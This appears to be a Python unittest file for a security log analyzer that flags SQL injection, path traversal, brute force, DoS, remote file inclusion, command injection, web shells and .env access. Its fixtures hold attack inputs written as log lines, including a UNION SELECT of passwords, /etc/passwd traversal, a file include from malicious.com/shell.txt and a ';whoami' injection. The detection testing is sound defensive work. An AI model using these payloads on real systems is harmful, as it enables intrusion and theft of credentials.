import unittest
from datetime import datetime, timedelta
from core.analyzer import LogAnalyzer, parse_line, ThreatLevel

class TestLogAnalyzer(unittest.TestCase):
    def test_parse_apache_combined(self):
        line = '192.168.1.45 - - [20/May/2026:17:00:00 +0000] "GET /login HTTP/1.1" 200 512'
        entry = parse_line(line)
        self.assertIsNotNone(entry)
        self.assertEqual(entry.ip, "192.168.1.45")
        self.assertEqual(entry.path, "/login")
        self.assertEqual(entry.status, 200)
        self.assertEqual(entry.method, "GET")

    def test_parse_ssh_failure(self):
        line = 'May 20 17:00:00 server sshd[1234]: Failed password for invalid user admin from 91.108.4.1 port 22 ssh2'
        entry = parse_line(line)
        self.assertIsNotNone(entry)
        self.assertEqual(entry.ip, "91.108.4.1")
        self.assertEqual(entry.user, "admin")

    def test_sqli_detection(self):
        analyzer = LogAnalyzer()
        log = '192.168.1.45 - - [20/May/2026:17:00:00 +0000] "GET /products?id=1\' UNION SELECT username,password FROM users-- HTTP/1.1" 200 512'
        report = analyzer.analyze(log)
        self.assertTrue(len(report.threats) > 0)
        sqli_threats = [t for t in report.threats if t.rule_id == "R001"]
        self.assertEqual(len(sqli_threats), 1)
        self.assertEqual(sqli_threats[0].level, ThreatLevel.HIGH)

    def test_path_traversal_detection(self):
        analyzer = LogAnalyzer()
        log = '192.168.1.45 - - [20/May/2026:17:00:00 +0000] "GET /../../etc/passwd HTTP/1.1" 403 512'
        report = analyzer.analyze(log)
        self.assertTrue(any(t.rule_id == "R003" for t in report.threats))

    def test_brute_force_detection(self):
        analyzer = LogAnalyzer()
        base_time = datetime.now()
        logs = []
        # Generate 6 failed logins in a short window
        for i in range(6):
            ts = (base_time + timedelta(seconds=i * 10)).strftime("%d/%b/%Y:%H:%M:%S +0000")
            logs.append(f'91.108.4.1 - - [{ts}] "POST /login HTTP/1.1" 401 512')
        
        report = analyzer.analyze("\n".join(logs))
        self.assertTrue(any(t.rule_id == "R008" for t in report.threats)) # R008 is Brute Force

    def test_dos_detection(self):
        analyzer = LogAnalyzer()
        base_time = datetime.now()
        logs = []
        # Generate 210 requests in a short window
        for i in range(210):
            ts = (base_time + timedelta(seconds=i * 1)).strftime("%d/%b/%Y:%H:%M:%S +0000")
            logs.append(f'172.16.0.9 - - [{ts}] "GET /api/heavy HTTP/1.1" 200 512')
            
        report = analyzer.analyze("\n".join(logs))
        self.assertTrue(any(t.rule_id == "R010" for t in report.threats)) # R010 is DoS

    def test_lfi_rfi_detection(self):
        analyzer = LogAnalyzer()
        log = '192.168.1.45 - - [20/May/2026:17:00:00 +0000] "GET /index.php?file=http://malicious.com/shell.txt HTTP/1.1" 200 512'
        report = analyzer.analyze(log)
        self.assertTrue(any(t.rule_id == "R011" for t in report.threats))

    def test_cmd_injection_detection(self):
        analyzer = LogAnalyzer()
        log = '192.168.1.45 - - [20/May/2026:17:00:00 +0000] "GET /run?cmd=;whoami HTTP/1.1" 200 512'
        report = analyzer.analyze(log)
        self.assertTrue(any(t.rule_id == "R012" for t in report.threats))

    def test_web_shell_detection(self):
        analyzer = LogAnalyzer()
        log = '192.168.1.45 - - [20/May/2026:17:00:00 +0000] "GET /uploads/shell.php HTTP/1.1" 200 512'
        report = analyzer.analyze(log)
        self.assertTrue(any(t.rule_id == "R013" for t in report.threats))

    def test_credential_leak_detection(self):
        analyzer = LogAnalyzer()
        log = '192.168.1.45 - - [20/May/2026:17:00:00 +0000] "GET /.env HTTP/1.1" 200 512'
        report = analyzer.analyze(log)
        self.assertTrue(any(t.rule_id == "R014" for t in report.threats))

    def test_json_log_parsing(self):
        analyzer = LogAnalyzer()
        # Test basic JSON format with auth failure
        json_log1 = '{"ip": "10.0.0.99", "user": "testuser", "path": "/secure/data", "method": "POST", "status": 401, "message": "unauthorized access", "timestamp": "2026-05-20T17:30:00Z"}'
        # Test JSON format with epoch timestamp and string status
        json_log2 = '{"client_ip": "172.16.1.100", "path": "/index.html", "status": "200 OK", "timestamp": 1779384600}' # May 20 2026 epoch
        
        report = analyzer.analyze(json_log1 + "\n" + json_log2)
        self.assertEqual(report.total_entries, 2)
        self.assertEqual(report.parsed_entries, 2)
        ips = [item[0] for item in report.top_ips]
        self.assertIn("10.0.0.99", ips)
        self.assertIn("172.16.1.100", ips)
        # Verify auth failure threat was found
        self.assertTrue(any(t.rule_id == "R006" for t in report.threats))

if __name__ == "__main__":
    unittest.main()
